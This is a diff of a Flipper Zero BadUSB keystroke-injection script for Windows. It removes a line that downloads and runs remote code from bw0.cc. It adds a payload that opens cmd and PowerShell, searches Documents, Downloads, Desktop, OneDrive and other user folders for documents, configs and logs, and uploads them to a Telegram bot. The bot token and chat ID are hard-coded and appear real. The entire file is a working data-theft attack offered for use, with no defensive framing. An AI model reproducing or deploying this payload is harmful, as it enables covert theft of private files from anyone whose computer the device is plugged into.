@@ -1,19 +1,68 @@
+REM Flipper Zero - Complete File Exfiltration
+REM Sends files from all user folders to Telegram
 
-REM Title: beigeworm's Exfiltrate files to Telegram
-REM Author: @beigeworm
-REM Description: This script searches the users folder fot pictures, documents, logs, PDFs and more, then sends its all to a dropbox account.
-REM Target: Windows 10
-
-REM *SETUP*
-REM replace TELEGRAM_TOKEN with your Telegram Token.
-
-REM some setup for dukie script
-DEFAULT_DELAY 100
-
-REM open powershell (remove -W Hidden to show the window)
-DELAY 1000
+DELAY 4000
 GUI r
-DELAY 750
-STRING powershell -Ep Bypass -C $tg='TELEGRAM_TOKEN'; iex (irm bw0.cc/extg)
+DELAY 800
+STRING cmd
 ENTER
+DELAY 1000
 
+REM 1. Start notification
+STRING curl "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendMessage?chat_id=6614794141&text=Flipper%20File%20Scanner%20Active"
+ENTER
+DELAY 2000
+
+REM 2. Scan and send ALL text-based files
+STRING powershell -c "
+# Configuration
+`$bot_token = '8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI'
+`$chat_id = '6614794141'
+`$telegram_url = 'https://api.telegram.org/bot' + `$bot_token
+
+# Folders to scan (all possible user locations)
+`$scan_folders = @(
+    `$env:USERPROFILE + '\\Documents',
+    `$env:USERPROFILE + '\\Downloads', 
+    `$env:USERPROFILE + '\\Desktop',
+    `$env:USERPROFILE + '\\Pictures',
+    `$env:USERPROFILE + '\\Videos',
+    `$env:USERPROFILE + '\\Music',
+    `$env:USERPROFILE + '\\OneDrive',
+    `$env:TEMP
+)
+
+# File types to collect
+`$file_types = @('*.txt', '*.log', '*.cfg', '*.conf', '*.ini', '*.json', '*.xml', '*.csv', '*.sql', '*.pdf', '*.doc', '*.docx', '*.xls', '*.xlsx')
+
+`$sent_count = 0
+`$error_count = 0
+
+foreach (`$folder in `$scan_folders) {
+    if (Test-Path `$folder -ErrorAction SilentlyContinue) {
+        foreach (`$type in `$file_types) {
+            try {
+                `$files = Get-ChildItem -Path `$folder -Filter `$type -File -Recurse -ErrorAction SilentlyContinue | Select-Object -First 10
+                foreach (`$file in `$files) {
+                    if (`$file.Length -lt 20MB) {
+                        `$result = curl.exe -s -F `"chat_id=`$chat_id`" -F `"document=@`$(`$file.FullName)`" `"`$telegram_url/sendDocument`"
+                        if (`$LASTEXITCODE -eq 0) {
+                            `$sent_count++
+                        } else {
+                            `$error_count++
+                        }
+                        Start-Sleep -Milliseconds 500
+                    }
+                }
+            } catch {
+                `$error_count++
+            }
+        }
+    }
+}
+
+# Send summary
+`$summary = `"Scan Complete`nFiles Sent: `$sent_count`nErrors: `$error_count`nPC: `$env:COMPUTERNAME`"
+curl.exe `"`$telegram_url/sendMessage?chat_id=`$chat_id&text=`$summary`"
+"
+ENTER
